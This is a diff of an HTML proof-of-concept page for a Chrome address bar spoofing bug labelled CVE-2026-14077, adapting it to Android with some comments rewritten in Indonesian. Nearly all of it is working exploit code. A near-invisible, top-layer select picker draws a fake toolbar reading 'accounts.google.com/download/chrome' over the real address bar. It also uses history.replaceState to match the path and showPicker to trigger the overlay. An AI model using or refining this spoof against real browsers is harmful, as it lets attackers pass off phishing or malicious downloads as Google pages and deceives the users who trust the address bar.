@@ -3,13 +3,13 @@
   <head>
     <meta charset="utf-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no, viewport-fit=cover" />
-    <title>CVE-2026-14077 Address Bar Spoofing PoC</title>
+    <title>Android Chrome Hardened Address Bar Spoofing PoC</title>
     <style>
       :root {
         --sel-left: 0px;
-        --sel-top: -42px;
+        --sel-top: -56px;
         --sel-w: 100vw;
-        --sel-h: 1200px;
+        --sel-h: 1500px;
       }
       body, html {
         margin: 0;
@@ -54,7 +54,7 @@
         word-break: break-all;
       }
       
-      /* Base-select geometry vector spoofing (CVE-2026-14077) */
+      /* Base-select geometry vector spoofing untuk Android Chrome */
       select, ::picker(select) {
         appearance: base-select;
       }
@@ -64,7 +64,7 @@
         top: var(--sel-top);
         width: var(--sel-w);
         height: var(--sel-h);
-        opacity: 0.01;
+        opacity: 0.001;
         z-index: 2147483647;
         border: none;
         outline: none;
@@ -75,16 +75,16 @@
         left: 0;
         top: 0;
         width: 100vw;
-        height: 60px;
+        height: 56px;
         margin-top: 0;
         border: 0;
         padding: 0;
         background: #35363a;
         display: flex;
         align-items: center;
-        padding-left: 54px;
+        padding-left: 48px;
         box-sizing: border-box;
-        box-shadow: 0 4px 12px rgba(0,0,0,0.5);
+        box-shadow: 0 4px 16px rgba(0,0,0,0.6);
       }
       option {
         font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
@@ -101,11 +101,11 @@
   </head>
   <body>
     <div class="container">
-      <button id="execBtn">INITIALIZE SPOOFING SURFACE</button>
-      <div class="info" id="statusInfo">Status: Ready to anchor picker geometry.</div>
+      <button id="execBtn">INITIALIZE ANDROID SPOOF SURFACE</button>
+      <div class="info" id="statusInfo">Status: Ready for mobile viewport anchor execution.</div>
     </div>
 
-    <!-- Negative Anchor Select Element for Picker Escaping -->
+    <!-- Negative Anchor Select Element khusus Android -->
     <select id="spoofSelect" size="5">
       <option value="spoof">
         <span class="host">accounts.google.com</span><span class="path">/download/chrome</span>
@@ -118,33 +118,33 @@
       let spoofSelect = document.getElementById("spoofSelect");
       let hasExecuted = false;
 
-      function triggerAddressBarSpoof() {
+      function triggerAndroidSpoof() {
         if (hasExecuted) return;
         hasExecuted = true;
 
-        statusInfo.innerText = "Status: Executing history state and native picker geometry push...";
+        statusInfo.innerText = "Status: Updating history state & triggering mobile picker surface...";
         execButton.style.display = "none";
 
         try {
-          // 1. Same-origin history state alteration to match target path suffix
+          // 1. Sinkronisasi history state jalur lokal same-origin
           history.replaceState({ target: "accounts.google.com" }, "", "/download/chrome");
 
-          // 2. Set index to -1 to suppress native checkmark gutter offset
+          // 2. Membersihkan indeks pilihan untuk menghilangkan indikator centang bawaan
           spoofSelect.selectedIndex = -1;
 
-          // 3. Trigger native picker popup under user interaction context
+          // 3. Eksekusi showPicker dalam konteks gestur pengguna aktif (user activation)
           spoofSelect.showPicker();
 
-          statusInfo.innerText = "Status: Picker surface anchored into toolbar region successfully.";
+          statusInfo.innerText = "Status: Mobile picker layer anchored successfully.";
         } catch (err) {
-          statusInfo.innerText = "Status: Execution error: " + err.message;
+          statusInfo.innerText = "Status: Execution notice: " + err.message;
           execButton.style.display = "block";
           hasExecuted = false;
         }
       }
 
       execButton.onclick = () => {
-        triggerAddressBarSpoof();
+        triggerAndroidSpoof();
       };
     </script>
   </body>
